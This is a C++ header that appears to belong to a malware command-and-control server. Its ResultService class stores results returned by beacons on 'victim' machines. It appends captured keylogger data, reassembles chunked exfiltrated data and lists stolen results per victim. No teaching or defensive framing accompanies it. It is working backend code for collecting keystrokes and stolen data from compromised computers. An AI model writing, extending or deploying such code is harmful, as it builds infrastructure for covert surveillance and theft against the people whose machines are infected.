#pragma once

#include "Beacon.hpp"
#include "ChunkAssembler.hpp"
#include "ExfilEnvelope.hpp"
#include "ResultDAO.hpp"
#include "IManager.hpp"

#include <optional>
#include <string>
#include <vector>

class IResultService {
public:
    virtual ~IResultService() = default;
    virtual ResultDAO store_command_result(const UUID& command_uid, const std::string& data) = 0;
    virtual ResultDAO store_beacon_result(const std::string& victim_uid, const CommandResult& result) = 0;
    virtual std::optional<ResultDAO> get_result_for_command(const UUID& command_uid) = 0;
    virtual std::vector<ResultDAO> list_for_victim(const UUID& victim_uid) = 0;
};

class ResultService final : public IResultService {
public:
    explicit ResultService(Manager<ResultDAO, ResultRepository>& manager) : manager_(manager) {}

    ResultDAO store_command_result(const UUID& command_uid, const std::string& data) override {
        ResultDAO result;
        result.command_uid = command_uid;
        result.data = data;
        return manager_.create(result);
    }

    ResultDAO store_beacon_result(const std::string& victim_uid, const CommandResult& beacon_result) override {
        if (beacon_result.kind == std::string(exfil::kKindKeylogger)) {
            auto& repo = *manager_.get_repo();
            if (auto existing = repo.get_by_command_uid(beacon_result.command_uid)) {
                ResultDAO updated = *existing;
                updated.data += beacon_result.result_data;
                updated.status = beacon_result.status;
                if (auto result = manager_.update(updated.id, updated)) {
                    return *result;
                }
            }
        }

        if (beacon_result.chunk_total > 1) {
            ResultDAO chunk;
            chunk.command_uid = beacon_result.command_uid;
            chunk.victim_uid = victim_uid;
            chunk.kind = beacon_result.kind.empty() ? std::string(exfil::kKindText) : beacon_result.kind;
            chunk.status = beacon_result.status;
            chunk.chunk_index = beacon_result.chunk_index;
            chunk.chunk_total = beacon_result.chunk_total;
            chunk.data = beacon_result.result_data;

            auto& repo = *manager_.get_repo();
            repo.upsert_chunk(chunk);

            if (beacon_result.status != exfil::kStatusSuccess) {
                return chunk;
            }

            const auto chunks = repo.list_chunks_for_command(beacon_result.command_uid);
            if (auto assembled = chunk_assembler::assemble(chunks, beacon_result.chunk_total)) {
                assembled->victim_uid = victim_uid;
                assembled->kind = chunk.kind;
                repo.remove_chunks_for_command(beacon_result.command_uid);
                return manager_.create(*assembled);
            }

            return chunk;
        }

        ResultDAO result;
        result.command_uid = beacon_result.command_uid;
        result.victim_uid = victim_uid;
        result.kind = beacon_result.kind.empty() ? std::string(exfil::kKindText) : beacon_result.kind;
        result.status = beacon_result.status;
        result.chunk_index = beacon_result.chunk_index;
        result.chunk_total = beacon_result.chunk_total;
        result.data = beacon_result.result_data;
        return manager_.create(result);
    }

    std::optional<ResultDAO> get_result_for_command(const UUID& command_uid) override {
        auto& repo = *manager_.get_repo();
        if (auto direct = repo.get_by_command_uid(command_uid)) {
            if (direct->chunk_total <= 1 || direct->chunk_index < 0) {
                return direct;
            }
        }

        const auto chunks = repo.list_chunks_for_command(command_uid);
        if (chunks.empty()) {
            return std::nullopt;
        }

        const int total = chunks.front().chunk_total;
        return chunk_assembler::assemble(chunks, total);
    }

    std::vector<ResultDAO> list_for_victim(const UUID& victim_uid) override {
        return manager_.get_repo()->list_for_victim(victim_uid);
    }

private:
    Manager<ResultDAO, ResultRepository>& manager_;
};
